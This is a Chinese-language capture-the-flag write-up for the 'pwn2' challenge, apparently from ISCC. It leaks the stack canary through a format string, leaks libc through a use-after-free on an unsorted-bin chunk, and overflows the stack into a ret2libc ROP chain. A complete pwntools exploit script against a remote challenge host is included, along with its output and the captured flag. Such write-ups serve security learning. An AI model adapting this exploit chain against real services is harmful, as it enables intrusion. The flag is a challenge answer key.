
## Basic Info

```text
Binary: pwn2
Libc: libc-2.31.so
Remote: 39.96.193.120:10006
SHA256(pwn2): eab320cc6a1a057ef5553326a551d05c86f9c88324b908faa3e4451b8fbb48fd
```

```text
Arch: amd64
RELRO: Full RELRO
Canary: enabled
NX: enabled
PIE: enabled
Stripped: no
```

## Solution

### Step 1: 泄露 Canary

在程序刚运行并要求用户输入名称时，其核心处理逻辑大概为：

```c
fgets(name, 6, stdin);
printf("Hello, ");
printf(name);
```

尽管此处限制了用户的输入长度（至多只能输入 5 个有效字符），但这依然满足我们注入 `%7$p` 的条件。经过调试确认，栈上第 7 个参数刚好存放着当前函数的 canary 数值。借此我们可以提前将 canary 打印出来，以便在后续触发栈溢出时将其填回原位，从而绕过安全校验。

### Step 2: 利用 UAF 泄露 Libc

当调用 `forge_slingring` 功能时，程序会申请大小为 `0x84` 的内存块（实际分配的 chunk 尺寸为 `0x90`）。而在 `discard_slingring` 函数执行清理操作时，仅仅调用了 `free(rings[idx])`，却遗漏了对全局数组内对应指针的清零操作：

```c
free(rings[idx]);
// rings[idx] is still dangling
```

随后，若调用 `show_slingrings`，程序仍会通过这个悬垂指针（dangling pointer）输出其指向的内存数据：

```c
printf("Ring Slot #%d  | [%d]   | %s", i, rings[i]->amount, rings[i]->dest);
```

具体的利用步骤设计如下：

1. 连续创建 9 个尺寸为 `0x90` 的 chunk。
2. 先释放前 7 个 chunk，以此将 tcache 链表填满。
3. 接着释放第 8 个（即索引为 7 的）chunk，使其顺利进入 unsorted bin 之中。
4. 执行 show 功能查看 slot 7 的信息，此时 `%s` 格式符便会把已释放 chunk 的 fd 指针（包含 libc 的相关地址）打印出来。

针对 glibc 2.31 版本，unsorted bin 的 fd 指针与 libc 基址之间存在固定的距离，即 `libc_base + 0x1ecbe0`。根据这一特性可以得出：

```python
libc_base = unsorted_fd - 0x1ecbe0
```

### Step 3: 栈溢出 Ret2libc

分析 `use_slingring` 函数可以发现一个非常直接的栈溢出缺陷：

```c
char spell[0x40];
fgets(spell, 0x100, stdin);
```

观察该函数的栈空间结构可知，从输入缓冲区到 canary 所在位置的距离是 `0x38` 字节，紧随其后的便是 saved rbp 与返回地址（return address）。得益于我们在第一步已经掌握了正确的 canary，所以能够部署如下的 payload 结构：

```text
"A" * 0x38
canary
"B" * 8
ret
pop rdi; ret
"/bin/sh"
system
```

结合题目提供的 `libc-2.31.so` 库文件，提取相应的 gadget 与函数符号：

```text
ret: 0x22679
pop rdi; ret: 0x23b6a
system: libc.sym["system"]
"/bin/sh": next(libc.search(b"/bin/sh\x00"))
```

完成 ROP 链的执行后，即可成功弹出 shell 并获取 flag。

## Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.clear(arch="amd64")
context.log_level = "info"

HOST = "39.96.193.120"
PORT = 10006

elf = ELF("./pwn2", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)

# On glibc 2.31, the unsorted-bin fd for this chunk points into main_arena.
UNSORTED_FD_OFF = 0x1ECBE0
RET = 0x22679
POP_RDI = 0x23B6A
BIN_SH = next(libc.search(b"/bin/sh\x00"))


def start():
    return remote(HOST, PORT)


def menu(p, choice):
    p.recvuntil(b"What do you want to do today?")
    p.recvuntil(b">>")
    p.sendline(str(choice).encode())


def forge(p, idx, dest=b"A", amount=1):
    menu(p, 2)
    p.recvuntil(b"(0-9)")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Enter destination location:")
    p.sendline(dest)
    p.recvuntil(b"(1-9):")
    p.sendline(str(amount).encode())
    p.recvuntil(b"Press ENTER to return.")
    p.sendline()


def discard(p, idx):
    menu(p, 3)
    p.recvuntil(b"discard?")
    p.sendline(str(idx).encode())


def show(p):
    menu(p, 1)
    data = p.recvuntil(b"Press ENTER to return.")
    p.sendline()
    return data


def leak_canary(p):
    p.recvuntil(b"What is your name?")
    p.sendline(b"%7$p")
    p.recvuntil(b"Hello, ")
    return int(p.recvline().strip(), 16)


def leak_libc_base(p):
    for i in range(9):
        forge(p, i, bytes([0x41 + i]), 1)

    for i in range(7):
        discard(p, i)
    discard(p, 7)

    data = show(p)
    marker = b"Ring Slot #7  | ["
    pos = data.find(marker)
    if pos < 0:
        raise RuntimeError("slot 7 leak marker not found")

    line = data[pos : data.find(b"\n", pos)]
    leak_part = line.split(b"]   | ", 1)[1]
    unsorted_fd = u64(leak_part[:6].ljust(8, b"\x00"))
    log.info("unsorted fd = %#x", unsorted_fd)
    return unsorted_fd - UNSORTED_FD_OFF


def exploit():
    p = start()

    canary = leak_canary(p)
    log.info("canary = %#x", canary)

    libc_base = leak_libc_base(p)
    log.info("libc base = %#x", libc_base)

    payload = flat(
        b"A" * 0x38,
        p64(canary),
        b"B" * 8,
        p64(libc_base + RET),
        p64(libc_base + POP_RDI),
        p64(libc_base + BIN_SH),
        p64(libc_base + libc.sym["system"]),
    )

    menu(p, 4)
    p.recvuntil(b"(id):")
    p.sendline(b"0")
    p.recvuntil(b"Please enter the spell:")
    p.sendline(payload)
    p.recvuntil(b"Transporting...")

    p.sendline(b"cat flag; cat /flag; cat /flag*; cat /home/ctf/flag* 2>/dev/null")
    print(p.recvrepeat(3).decode("latin-1", "replace"))
    p.close()


if __name__ == "__main__":
    exploit()
```

## Result

```text
$ python3 solve.py
[*] canary = 0x9507e80b2db9f00
[*] unsorted fd = 0x7fe8ecffcbe0
[*] libc base = 0x7fe8ece10000

ISCC{ff9e0a07-1f89-44e9-a17c-838661b23dc3}
```

## Flag

```text
ISCC{ff9e0a07-1f89-44e9-a17c-838661b23dc3}
```